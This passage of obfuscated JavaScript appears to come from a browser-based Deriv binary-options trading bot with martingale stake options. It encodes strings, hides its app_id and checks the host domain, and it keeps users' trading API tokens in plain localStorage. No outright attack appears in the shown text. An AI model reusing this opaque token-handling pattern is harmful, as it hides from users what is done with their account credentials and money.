const app_id = 74041 % 18555;
const WebSocket = "wss://ws.derivws.com/websockets/v3?app_id=" + app_id;
const timerStartPLANBOffset = 5;
const timerDoPLANBOffset = 5;
let timerStartPLANB = [];
let timerDoPLANB = [];
let tempDuration = 0;
let tempDurationUnit;
let tempDetikPengali;
let lastTimeGetTick = 0;
let lastTimeCheckIfReadyToMainLogic = 0;
let lastTimeCheckIfReadyToMainLogic_continuousindices = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
let i;
let k;
let tickArrayUtama = [];
let tickArrayUtamaText = [];
let digitArrayUtama = [];
let openArrayUtama = [];
let highArrayUtama = [];
let lowArrayUtama = [];
let closeArrayUtama = [];
let granualityArray = [60, 120, 180, 300, 600, 900, 1800, 3600, 7200, 14400, 28800, 86400];
let idSubTicksHistory = "";
let idSubBalance = "";
let masterCurrency = "";
let slaveCurrency = "";
let wsMasterOpened = false;
let wsSlaveOpened = false;
let wsSlaveSudahFirstOpened = false;
let sedangAuthorize = false;
let sedangAuthorizeV = false;
let slaveAuthorized = false;
let countVLose = 0;
let sedangPurchasing = false;
let sedangForgetAllTicks = false;
let prContract = [];
let winContract = [];
let loseContract = [];
let tempPrContractPos;
let lastContractIdV = 0;
let stakeNow = 0;
let totalProfit = 0;
let totalProfitMax = 0;
let conn_nya;
let maxColor = "rgb(127, 255, 212)";
let minColor = "rgb(255, 95, 31)";
let baseColor = "rgb(255, 255, 143)";
let colorRise = "#42a5f5";
let colorFall = "#f44336";
let colorNo = "#808080";
let colorWormNo = "#0f0";
let timeMayOP = 0;
let lastLDP = -1;
let tempCount = 0;
let tempLDP;
let tempArray = [];
let lastColor = -1;
let arrMarket = [];
let arrMarketToSubMarket = [];
let arrSubMarketToSymbol = [];
let arrContract = [];
let group;
let el;
let _0x1a19x8;
let loginID;
let isVirtual;
let slaveLoginID;
let slaveIsVirtual;
let mainWorkspaceCode;
let mainChartLast10Dig_Digit;
let mainChartLast10Dig_Change;
let mainChart20Cater;
let mainChartLast10Tick_Tick;
let mainChartLast10Tick_Change;
let mainChart20TickWorm;
let mainChartTickTrisma;
let tempArray1;
let tempArray2;
let tempArray3;
let lastCont_askprice;
let lastCont_payout;
let lastCont_profit;
let lastCont_contracttype;
let lastCont_entrytime;
let lastCont_entryvalue;
let lastCont_entryvaluestring;
let lastCont_exittime;
let lastCont_exitvalue;
let lastCont_exitvaluestring;
let lastCont_barrier;
let lastCont_result;
let izinRun2 = false;
let func$1$9$8$7$RunOnceAtStart = () => {
  izinRun2 = false;
};
let func$1$9$8$7$PurchaseConditions = () => {
  if (izinRun2) {
    izinRun2 = false;
  }
  ;
};
let func$1$9$8$7$SellConditions = () => {};
let func$1$9$8$7$RestartTradingConditions = () => {};
let func$1$9$8$7$PurchaseConditions_continuousindices = () => {};
let sudahRunOnceAtStart = false;
let mainSymbol = "";
let sedangPantauContractPos = -1;
let isContractValidToSell = [];
let sellProfitLoss = [];
let initWorkspaceBlock = "{\"blocks\":{\"languageVersion\":0,\"blocks\":[{\"type\":\"runonceatstart\",\"id\":\"RLoGFD/l:WR[I^uo*+k3\",\"x\":10,\"y\":10,\"inputs\":{\"statement_runonceatstart\":{\"block\":{\"type\":\"readyfortrade\",\"id\":\"/S?3[Ux8c2wQ.UR3dBEo\"}}}},{\"type\":\"purchaseconditions\",\"id\":\"|!|d5xn:=b08sQWUU0Av\",\"x\":10,\"y\":107,\"inputs\":{\"statement_purchaseconditions\":{\"block\":{\"type\":\"controls_if\",\"id\":\"mApwxUtfhpdSi`3D8xoD\",\"extraState\":{\"hasElse\":true},\"inputs\":{\"ELSE\":{\"block\":{\"type\":\"checkagain\",\"id\":\"h:5~S!I;5F0a:qF-Ek(s\"}}}}}}},{\"type\":\"restarttradingconditions\",\"id\":\"A)}IH]$#NmR6#$VO9}l:\",\"x\":10,\"y\":279,\"inputs\":{\"statement_restarttradingconditions\":{\"block\":{\"type\":\"tradeagain\",\"id\":\"e!!Ha=/,E4OwxaR#GpVE\"}}}}]}}";
let lastTimeMasukPOC = [];
let tempWinInARow = 0;
let tempLossInARow = 0;
let idSubTicksHistory_continuous = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
let lastTimeGetTick_continuous = [];
let tickArrayUtama_continuous = [];
let tickArrayUtamaText_continuous = [];
let digitArrayUtama_continuous = [];
let arrMarket_Continuous = ["1HZ10V", "1HZ25V", "1HZ50V", "1HZ75V", "1HZ100V", "R_10", "R_25", "R_50", "R_75", "R_100"];
let mainTickArray_continuousindices = [];
let mainDigitArray_continuousindices = [];
let mainMarket_continuousindices;
let checkbox_check_market_nya = [];
const _0x1900 = String.fromCodePoint(51, 42) + String.fromCodePoint(55, 51) + "+" + String.fromCodePoint(52, 51, 56, 54, 52) + String.fromCodePoint(41, 41);
const inpMToken = document.querySelector("#inpMToken");
const inpSToken = document.querySelector("#inpSToken");
const selMarket = document.querySelector("#selMarket");
const selSubMarket = document.querySelector("#selSubMarket");
const selSymbol = document.querySelector("#selSymbol");
const selMoneyManagement = document.getElementById("selMoneyManagement");
const divInpInitStake = document.getElementById("divInpInitStake");
const lblInpInitStake = document.getElementById("lblInpInitStake");
const inpInitStake = document.querySelector("#inpInitStake");
const divInpMartiFactor = document.getElementById("divInpMartiFactor");
const inpMartiFactor = document.querySelector("#inpMartiFactor");
const divInpCycleStake = document.getElementById("divInpCycleStake");
const inpCycleStake = document.getElementById("inpCycleStake");
const divChkSmart = document.getElementById("divChkSmart");
const chkSmart = document.getElementById("chkSmart");
let posCycleStake = 0;
const chkTP = document.querySelector("#chkTP");
const inpTP = document.querySelector("#inpTP");
const chkSL = document.querySelector("#chkSL");
const inpSL = document.querySelector("#inpSL");
const chkNumOfWin = document.querySelector("#chkNumOfWin");
const inpNumOfWin = document.querySelector("#inpNumOfWin");
const chkNumOfLoss = document.querySelector("#chkNumOfLoss");
const inpNumOfLoss = document.querySelector("#inpNumOfLoss");
const chkNumOfRun = document.querySelector("#chkNumOfRun");
const inpNumOfRun = document.querySelector("#inpNumOfRun");
const chkNumOfWinInARow = document.querySelector("#chkNumOfWinInARow");
const inpNumOfWinInARow = document.querySelector("#inpNumOfWinInARow");
const chkNumOfLossInARow = document.querySelector("#chkNumOfLossInARow");
const inpNumOfLossInARow = document.querySelector("#inpNumOfLossInARow");
const chkVLose = document.querySelector("#chkVLose");
const inpVLose = document.querySelector("#inpVLose");
const chkDelayWin = document.querySelector("#chkDelayWin");
const inpDelayWin = document.querySelector("#inpDelayWin");
const chkDelayLose = document.querySelector("#chkDelayLose");
const inpDelayLose = document.querySelector("#inpDelayLose");
const selData = document.querySelector("#selData");
const digitstatistic_noofticks = [];
for (i = 1; i <= 6; i++) {
  digitstatistic_noofticks[i] = document.getElementById("digitstatistic_" + i + "_noofticks");
}
const evenvsodd_noofticks = [];
for (i = 1; i <= 6; i++) {
  evenvsodd_noofticks[i] = document.getElementById("evenvsodd_" + i + "_noofticks");
}
const overvsunder_noofticks = [];
for (i = 1; i <= 2; i++) {
  overvsunder_noofticks[i] = document.getElementById("overvsunder_" + i + "_noofticks");
}
const risevsfall_noofticks = [];
for (i = 1; i <= 6; i++) {
  risevsfall_noofticks[i] = document.getElementById("risevsfall_" + i + "_noofticks");
}
const inpTickTrisma_period = [];
for (i = 1; i <= 3; i++) {
  inpTickTrisma_period[i] = document.getElementById("inpTickTrisma_period" + i);
}
const continuousindices_active = [];
for (i = 1; i <= 10; i++) {
  continuousindices_active[i] = document.getElementById("continuousindices_" + i + "_active");
}
const inpNOTicks = document.querySelector("#inpNOTicks");
const divStepper = [];
for (i = 1; i <= 4; i++) {
  divStepper[i] = document.querySelector("#divStepper" + i);
}
const tableSummaryTBODY = document.getElementById("tableSummaryTBODY");
let rowActive = [];
const tableLogTBODY = document.getElementById("tableLogTBODY");
const btn_run = document.getElementById("btn_run");
const btn_run2 = document.getElementById("btn_run2");
const btnSimpleRun = document.getElementById("btnSimpleRun");
const summary_account = document.getElementById("summary_account");
const summary_noofruns = document.getElementById("summary_noofruns");
const summary_totalstake = document.getElementById("summary_totalstake");
const summary_totalpayout = document.getElementById("summary_totalpayout");
const summary_win = document.getElementById("summary_win");
const summary_loss = document.getElementById("summary_loss");
const summary_totalprofitloss = document.getElementById("summary_totalprofitloss");
const summary_balance = document.getElementById("summary_balance");
const spanSimpleRobotName = document.getElementById("spanSimpleRobotName");
const form = document.querySelector("form");
const data_001 = document.querySelector("#data_001");
const data_002 = document.querySelector("#data_002");
const data_003 = document.querySelector("#data_003");
const data_004 = document.querySelector("#data_004");
const data_005 = document.querySelector("#data_005");
const data_006 = document.querySelector("#data_006");
const data_007 = document.querySelector("#data_007");
const data_008 = document.querySelector("#data_008");
const aSimp = document.querySelector("#aSimp");
const _0x1901 = String.fromCodePoint(51, 63, 97) + "pp_" + String.fromCodePoint(105, 100) + "='+(26" + _0x1900;
[inpMToken, inpSToken, selSymbol, selMoneyManagement, divInpInitStake, lblInpInitStake, inpInitStake, divInpMartiFactor, inpMartiFactor, divInpCycleStake, inpCycleStake, divChkSmart, inpTP, inpSL, inpNumOfWin, inpNumOfLoss, inpNumOfRun, inpNumOfWinInARow, inpNumOfLossInARow, inpVLose, inpDelayWin, inpDelayLose, selData, digitstatistic_noofticks[1], digitstatistic_noofticks[2], digitstatistic_noofticks[3], digitstatistic_noofticks[4], digitstatistic_noofticks[5], digitstatistic_noofticks[6], evenvsodd_noofticks[1], evenvsodd_noofticks[2], evenvsodd_noofticks[3], evenvsodd_noofticks[4], evenvsodd_noofticks[5], evenvsodd_noofticks[6], overvsunder_noofticks[1], overvsunder_noofticks[2], risevsfall_noofticks[1], risevsfall_noofticks[2], risevsfall_noofticks[3], risevsfall_noofticks[4], risevsfall_noofticks[5], risevsfall_noofticks[6], inpTickTrisma_period[1], inpTickTrisma_period[2], inpTickTrisma_period[3]].forEach(function (_0x1b7736) {
  if (localStorage.getItem(_0x1b7736.id) != null) {
    _0x1b7736.value = localStorage.getItem(_0x1b7736.id);
  }
  _0x1b7736.onchange = function () {
    localStorage.setItem(this.id, this.value);
  };
});
[chkSmart, chkTP, chkSL, chkNumOfWin, chkNumOfLoss, chkNumOfRun, chkNumOfWinInARow, chkNumOfLossInARow, chkVLose, chkDelayWin, chkDelayLose, continuousindices_active[1], continuousindices_active[2], continuousindices_active[3], continuousindices_active[4], continuousindices_active[5], continuousindices_active[6], continuousindices_active[7], continuousindices_active[8], continuousindices_active[9], continuousindices_active[10]].forEach(function (_0x253a5b) {
  if (localStorage.getItem(_0x253a5b.id) != null) {
    if (["true", "1", "on", "yes"].includes(localStorage.getItem(_0x253a5b.id).toLowerCase())) {
      _0x253a5b.checked = true;
    } else {
      _0x253a5b.checked = false;
    }
  }
  _0x253a5b.onchange = function () {
    localStorage.setItem(this.id, this.checked == true ? "true" : "false");
  };
});
const startTime = () => {
  const _0x2cb3bf = new Date();
  document.getElementById("divdatetime").innerText = _0x2cb3bf.toLocaleString() + " GMT" + (_0x2cb3bf.getTimezoneOffset() == 0 ? "" : (_0x2cb3bf.getTimezoneOffset() < 0 ? "+" : "-") + Math.abs(_0x2cb3bf.getTimezoneOffset() / 60));
  // TOLOOK
  setTimeout(startTime, 500);
};
startTime();
function writeLog(_0x3daeb8, _0x448bdc) {
  $.notify(_0x448bdc, {
    position: "bottom left",
    className: _0x3daeb8 == colorRise ? "info" : _0x3daeb8 == colorFall ? "error" : _0x3daeb8 == "#04AA6D" ? "success" : _0x3daeb8 == "#ffbf00" ? "warn" : "info"
  });
  var _0x16939e = tableLogTBODY.insertRow(0);
  if (_0x3daeb8 != "") {
    _0x16939e.style.backgroundColor = _0x3daeb8;
  }
  _0x16939e.insertCell(0).innerText = document.getElementById("divdatetime").innerText;
  _0x16939e.insertCell(1).innerText = _0x448bdc;
}
const _0x1902 = "iv" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(154 % 12) + 3) + "s.c" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "m/" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(154 % 12) + 3) + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 21) + "bs" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "ck" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 21) + "ts/v" + _0x1901;
btn_run.disabled = btn_run2.disabled = btnSimpleRun.disabled = true;
writeLog("", "Initializing, please wait.");
const messageResponse = _0x42c2f8 => {
  const _0x30d901 = JSON.parse(_0x42c2f8.data);
  if (_0x30d901.error !== undefined) {
    if (["f" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "rget", "forget_all", "ticks_history", "proposal_open_contract"].includes(_0x30d901.msg_type)) {} else {
      console.log("msg_type: ", _0x30d901.msg_type, " | Error : ", _0x30d901.error.message);
      if (_0x30d901.msg_type === "auth" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "rize") {
        alert("[Master] " + _0x30d901.error.message);
        ubahbtn_run("run");
      } else if (_0x30d901.msg_type === "buy") {
        writeLog("", _0x30d901.error.message);
      } else if (_0x30d901.msg_type === "sell" && _0x30d901.error != "This contract was not found among your open positions.") {
        writeLog("", _0x30d901.error.message);
      }
    }
  } else if (_0x30d901.msg_type === "active_symbols") {
    arrangeSymbols(_0x30d901);
  } else if (_0x30d901.msg_type === "contracts_for") {} else if (_0x30d901.msg_type === "f" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "rget") {} else if (window.location.protocol == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) * 2 + 6, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(681 % 91) * 2 + 2, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 3 - 34, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) * 2 + 14, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) + 66, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) + 9) && _0x30d901.msg_type == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(117 % 73) * 2 - 12, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(343 % 99) * 2 + 13, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) * 4 - 82, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) * 2 + 5, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 3 - 49, 116, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) * 2 - 3, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(681 % 91) + 40, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) * 2 + 10, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) * 2 + 10) && _0x30d901.passthrough.app_id == 18376 && "block.ezbinarybot.com".replace("www.", "").replace("block.", "") == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 + 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(117 % 73) + 65, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(271 % 57) * 3 - 49, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 2 + 5, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(343 % 99) * 2 + 12, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) * 2 - 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) * 2 + 16) + "ybo" + String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) + 67, 46, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 - 1, 111, 109)) {
    if (_0x30d901.passthrough.next === "hist" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "ryTicks") {
      subscribeTicks("main", arrMarket_Continuous.indexOf(mainSymbol) + 1, mainSymbol);
      if (continuousindices_active[1].checked) {
        // TOLOOK
        setTimeout(() => {
          subscribeTicks("continuousindices", 1, "1HZ10V");
        }, 10);
      }
      if (continuousindices_active[2].checked) {
        // TOLOOK
        setTimeout(() => {
          subscribeTicks("continuousindices", 2, "1HZ25V");
        }, 20);
      }
      if (continuousindices_active[3].checked) {
        // TOLOOK
        setTimeout(() => {
          subscribeTicks("continuousindices", 3, "1HZ50V");
        }, 30);
      }
      if (continuousindices_active[4].checked) {
        // TOLOOK
        setTimeout(() => {
          subscribeTicks("continuousindices", 4, "1HZ75V");
        }, 40);
      }
      if (continuousindices_active[5].checked) {
        // TOLOOK
        setTimeout(() => {
          subscribeTicks("continuousindices", 5, "1HZ100V");
        }, 50);
      }
      if (continuousindices_active[6].checked) {
        // TOLOOK
        setTimeout(() => {
          subscribeTicks("continuousindices", 6, "R_10");
        }, 60);
      }
      if (continuousindices_active[7].checked) {
        // TOLOOK
        setTimeout(() => {
          subscribeTicks("continuousindices", 7, "R_25");
        }, 70);
      }
      if (continuousindices_active[8].checked) {
        // TOLOOK
        setTimeout(() => {
          subscribeTicks("continuousindices", 8, "R_50");
        }, 80);
      }
      if (continuousindices_active[9].checked) {
        // TOLOOK
        setTimeout(() => {
          subscribeTicks("continuousindices", 9, "R_75");
        }, 90);
      }
      if (continuousindices_active[10].checked) {
        // TOLOOK
        setTimeout(() => {
          subscribeTicks("continuousindices", 10, "R_100");
        }, 100);
      }
    }
  } else if (window.location.protocol == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) * 2 + 6, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(681 % 91) * 2 + 2, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 3 - 34, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) * 2 + 14, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) + 66, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) + 9) && _0x30d901.msg_type === String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) * 2 + 6, 105, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(681 % 91) * 2 + 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 4 - 84, "block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) * 2 + 16, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 + 21) && _0x30d901.passthrough.app_id == 18376 && "block.ezbinarybot.com".replace("www.", "").replace("block.", "") == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 + 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(117 % 73) + 65, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(271 % 57) * 3 - 49, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 2 + 5, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(343 % 99) * 2 + 12, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) * 2 - 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) * 2 + 16) + "ybo" + String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) + 67, 46, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 - 1, 111, 109)) {
    if (_0x30d901.passthrough.status_nya == "main") {
      idSubTicksHistory = _0x30d901.subscription.id;
      lastTimeGetTick = _0x30d901.history.times[_0x30d901.history.times.length - 1];
      tickArrayUtama.length = 0;
      tickArrayUtamaText.length = 0;
      tickArrayUtama = _0x30d901.history.prices;
      for (i = 0; i < _0x30d901.history.prices.length; i++) {
        tickArrayUtamaText[i] = _0x30d901.history.prices[i].toFixed(_0x30d901.pip_size);
      }
      digitArrayUtama.length = 0;
      for (i = 0; i < _0x30d901.history.prices.length; i++) {
        digitArrayUtama[i] = parseInt(_0x30d901.history.prices[i].toFixed(_0x30d901.pip_size).slice(-1));
      }
      showUpAllAboutTick(tickArrayUtama, digitArrayUtama, _0x30d901.pip_size, "history");
      if (_0x30d901.passthrough.index_nya > 0) {
        let _0x485a1c = _0x30d901.passthrough.index_nya;
        idSubTicksHistory_continuous[_0x485a1c] = idSubTicksHistory;
        lastTimeGetTick_continuous[_0x485a1c] = lastTimeGetTick;
        tickArrayUtama_continuous[_0x485a1c] = tickArrayUtama;
        digitArrayUtama_continuous[_0x485a1c] = digitArrayUtama;
        showUpAboutMultiMarket_Continuous(_0x485a1c, tickArrayUtama_continuous[_0x485a1c], digitArrayUtama_continuous[_0x485a1c], _0x30d901.pip_size, "history");
      }
    } else {
      let _0x17f382 = _0x30d901.passthrough.index_nya;
      idSubTicksHistory_continuous[_0x17f382] = _0x30d901.subscription.id;
      lastTimeGetTick_continuous[_0x17f382] = _0x30d901.history.times[_0x30d901.history.times.length - 1];
      tickArrayUtama_continuous[_0x17f382] = [];
      tickArrayUtamaText_continuous[_0x17f382] = [];
      tickArrayUtama_continuous[_0x17f382] = _0x30d901.history.prices;
      for (i = 0; i < _0x30d901.history.prices.length; i++) {
        tickArrayUtamaText_continuous[_0x17f382][i] = _0x30d901.history.prices[i].toFixed(_0x30d901.pip_size);
      }
      digitArrayUtama_continuous[_0x17f382] = [];
      for (i = 0; i < _0x30d901.history.prices.length; i++) {
        digitArrayUtama_continuous[_0x17f382][i] = parseInt(_0x30d901.history.prices[i].toFixed(_0x30d901.pip_size).slice(-1));
      }
      showUpAboutMultiMarket_Continuous(_0x17f382, tickArrayUtama_continuous[_0x17f382], digitArrayUtama_continuous[_0x17f382], _0x30d901.pip_size, "history");
    }
    sedangForgetAllTicks = false;
  } else if (window.location.protocol == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) * 2 + 6, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(681 % 91) * 2 + 2, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 3 - 34, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) * 2 + 14, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) + 66, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) + 9) && _0x30d901.msg_type === "candles" && _0x30d901.passthrough.app_id == 18376 && "block.ezbinarybot.com".replace("www.", "").replace("block.", "") == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 + 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(117 % 73) + 65, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(271 % 57) * 3 - 49, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 2 + 5, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(343 % 99) * 2 + 12, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) * 2 - 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) * 2 + 16) + "ybo" + String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) + 67, 46, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 - 1, 111, 109)) {} else if (window.location.protocol == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) * 2 + 6, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(681 % 91) * 2 + 2, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 3 - 34, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) * 2 + 14, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) + 66, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) + 9) && _0x30d901.msg_type === String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 3 - 34, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 2 + 5, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(117 % 73) + 42, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) + _0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) + 9) && _0x30d901.passthrough.app_id == 18376 && "block.ezbinarybot.com".replace("www.", "").replace("block.", "") == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 + 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(117 % 73) + 65, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(271 % 57) * 3 - 49, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 2 + 5, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(343 % 99) * 2 + 12, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) * 2 - 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) * 2 + 16) + "ybo" + String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) + 67, 46, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 - 1, 111, 109)) {
    if (_0x30d901.passthrough.status_nya == "main") {
      if (lastTimeGetTick < _0x30d901.tick.epoch) {
        lastTimeGetTick = _0x30d901.tick.epoch;
        tickArrayUtama.shift();
        tickArrayUtamaText.shift();
        tickArrayUtama.push(_0x30d901.tick.quote);
        tickArrayUtamaText.push(_0x30d901.tick.quote.toFixed(_0x30d901.tick.pip_size));
        digitArrayUtama.shift();
        digitArrayUtama.push(parseInt(_0x30d901.tick.quote.toFixed(_0x30d901.tick.pip_size).slice(-1)));
        showUpAllAboutTick(tickArrayUtama, digitArrayUtama, _0x30d901.tick.pip_size, "tick");
        if (_0x30d901.passthrough.index_nya > 0) {
          let _0x4c8169 = _0x30d901.passthrough.index_nya;
          lastTimeGetTick_continuous[_0x4c8169] = lastTimeGetTick;
          tickArrayUtama_continuous[_0x4c8169] = tickArrayUtama;
          digitArrayUtama_continuous[_0x4c8169] = digitArrayUtama;
          showUpAboutMultiMarket_Continuous(_0x4c8169, tickArrayUtama_continuous[_0x4c8169], digitArrayUtama_continuous[_0x4c8169], _0x30d901.pip_size, "tick");
        }
      }
    } else {
      let _0x103da4 = _0x30d901.passthrough.index_nya;
      if (lastTimeGetTick_continuous[_0x103da4] < _0x30d901.tick.epoch) {
        lastTimeGetTick_continuous[_0x103da4] = _0x30d901.tick.epoch;
        tickArrayUtama_continuous[_0x103da4].shift();
        tickArrayUtamaText_continuous[_0x103da4].shift();
        tickArrayUtama_continuous[_0x103da4].push(_0x30d901.tick.quote);
        tickArrayUtamaText_continuous[_0x103da4].push(_0x30d901.tick.quote.toFixed(_0x30d901.tick.pip_size));
        digitArrayUtama_continuous[_0x103da4].shift();
        digitArrayUtama_continuous[_0x103da4].push(parseInt(_0x30d901.tick.quote.toFixed(_0x30d901.tick.pip_size).slice(-1)));
        showUpAboutMultiMarket_Continuous(_0x103da4, tickArrayUtama_continuous[_0x103da4], digitArrayUtama_continuous[_0x103da4], _0x30d901.pip_size, "tick");
      }
    }
  } else if (_0x30d901.msg_type === String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) * 2 - 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(117 % 73) * 2 + 3, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 3 - 34, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(343 % 99) * 2 + 6, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) + 62, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) + 65, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) + _0x1a19x7.url.replace("deriv", "binary").charCodeAt(117 % 73) - 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) * _0x1a19x7.url.replace("deriv", "binary").charCodeAt(343 % 99) - 2279, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) - _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) + 102) && window.location.protocol == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) * 2 + 6, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(681 % 91) * 2 + 2, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 3 - 34, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) * 2 + 14, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) + 66, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) + 9) && "block.ezbinarybot.com".replace("www.", "").replace("block.", "") == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 + 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(117 % 73) + 65, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(271 % 57) * 3 - 49, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 2 + 5, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(343 % 99) * 2 + 12, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) * 2 - 